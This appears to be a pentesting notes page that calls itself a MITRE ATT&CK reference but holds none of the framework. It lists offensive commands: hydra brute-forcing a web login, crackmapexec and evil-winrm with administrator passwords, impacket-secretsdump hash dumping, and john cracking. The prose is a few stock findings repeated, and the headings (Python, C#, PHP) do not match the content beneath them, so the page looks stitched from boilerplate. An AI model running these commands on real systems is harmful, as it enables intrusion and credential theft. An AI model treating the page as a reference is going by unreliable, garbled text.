---
TitleSEO: "MITRE ATT&CK Framework Reference | ZureFX"
TitlePost: "MITRE ATT&CK Framework Reference"
Author: "ZureFX"
Description: "Personal notes on MITRE ATT&CK Framework Reference. Quick reference for pentesting and CTF challenges."
Keywords: "persistence, malware, windows, linux, cheatsheet, oscp"
URL: "https://zurefx.github.io/notes/note-mitre-att&ck-framework-reference-222.html"
URL_IMAGES: ""
Date: "2024-12-21"
Tags: "Persistence, Malware, Windows, Linux, Cheatsheet, OSCP"
Section: "notes"
Lang: "en"
main_img: "note-mitre-att&ck-framework-reference-222"
Permalink: "/notes/note-mitre-att&ck-framework-reference-222.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Python

### GetUserSPNs

```bash
nmap -sCV -p8080,995,23 10.28.66.97 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.30.126.1 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The backup files contained sensitive information that should not have been accessible. Network traffic analysis revealed unencrypted communications containing user credentials. Command injection was possible through unsanitized user input in the search functionality.

## C#

### smbclient

Network traffic analysis revealed unencrypted communications containing user credentials. Authentication bypass was achieved through careful manipulation of the login mechanism. Command injection was possible through unsanitized user input in the search functionality. Authentication bypass was achieved through careful manipulation of the login mechanism. Unconstrained delegation was enabled on the compromised machine.

> **Note:** XSS was identified as the primary attack vector in this scenario.

Network traffic analysis revealed unencrypted communications containing user credentials. Lateral movement was facilitated by reusing discovered credentials across services.

## SNMP

### hydra

```bash
nmap -sCV -p9200,25,995 10.27.87.225 -oN scan.txt
crackmapexec smb 10.58.220.21 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.58.143.130/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Lateral movement was facilitated by reusing discovered credentials across services. Unconstrained delegation was enabled on the compromised machine. Privilege escalation was possible due to misconfigured sudo permissions. Initial enumeration revealed several interesting open ports on the target.

The application stored sensitive credentials in an unencrypted configuration file. The target system was identified as running a vulnerable version of the service.

- `rubeus`
- `XXE`
- `hashcat`
- `GetNPUsers`

## DLL Hijacking

### NFS

The kernel version was outdated and vulnerable to a publicly known exploit. The database credentials were hardcoded in the application source code.

```bash
nmap -sCV -p22,3306,587 10.124.195.239 -oN scan.txt
feroxbuster -h
```

```powershell
evil-winrm -i 10.43.45.107 -u administrator -p 'P@ssw0rd!'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## PHP

### burpsuite

The target system was identified as running a vulnerable version of the service. The database credentials were hardcoded in the application source code. Privilege escalation was possible due to misconfigured sudo permissions. Weak file permissions allowed modification of critical system files. Privilege escalation was possible due to misconfigured sudo permissions.

> **Note:** Remote Code Execution was identified as the primary attack vector in this scenario.

```bash
nmap -sCV -p5986,445,445 10.64.187.3 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.117.217.36
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.28.180.103 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The scheduled task ran with elevated privileges and could be abused for escalation. Authentication bypass was achieved through careful manipulation of the login mechanism.
